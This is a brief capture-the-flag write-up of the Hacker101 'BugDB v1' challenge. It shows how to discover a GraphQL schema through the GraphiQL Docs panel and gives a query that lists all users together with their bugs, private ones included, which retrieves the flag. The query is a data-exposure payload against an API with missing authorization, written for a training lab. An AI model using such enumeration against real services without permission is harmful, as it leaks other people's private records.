# Hacker101 CTF: BugDB v1

Here we have a deal with GraphQL and its web-IDE GraphiQL. In the beginning, let's discover what information is openly available to us.
Click on the `Docs` link in the top-right corner and we see the list of accessible fields. We have two main types: `User` and `Bug`.
So, let's try to get all users and information about them. Consistently navigate through the links in Docs and collect data for a request.

```graphql
query{
  allUsers{
    edges{
      node{
        id
        username
        bugs{
          edges{
            node{
              id
              reporterId
              text
              private
            }
          }
        }
      }
    }
  }
}
```
This was enough to get the **FLAG**.


